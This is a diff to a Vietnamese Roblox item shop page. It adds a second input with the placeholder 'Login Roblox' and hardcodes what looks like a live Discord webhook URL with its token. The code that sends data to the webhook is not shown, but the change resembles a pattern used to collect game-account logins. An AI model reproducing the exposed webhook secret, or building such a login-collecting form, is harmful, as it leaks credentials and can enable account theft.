@@ -82,6 +82,9 @@ button{background:#1e90ff;color:#fff;border:none;font-weight:bold}
 
 <div class="price">Giá: <span id="price">0đ</span></div>
 <input id="rbx" placeholder="Username Roblox">
+
+<input id="rbx" placeholder="Login Roblox">
+  
 <textarea id="note" placeholder="Ghi chú"></textarea>
 <button onclick="buy()">🛒 MUA</button>
 </div>
@@ -114,7 +117,7 @@ firebase.initializeApp(firebaseConfig);
 
 const auth = firebase.auth();
 const db = firebase.firestore();
-const WEBHOOK = "DISCORD_WEBHOOK_CỦA_BẠN";
+const WEBHOOK = "https://discord.com/api/webhooks/1465766093543964673/QfBdKIbYOgo5_s9S_YaJDF6vg6ZF8RyWwEw06uPZW3YtZuPUjCmODVJfdFmowfH1d9Gm";
 
 goi.onchange = () => price.innerText = (+goi.value).toLocaleString()+"đ";
 
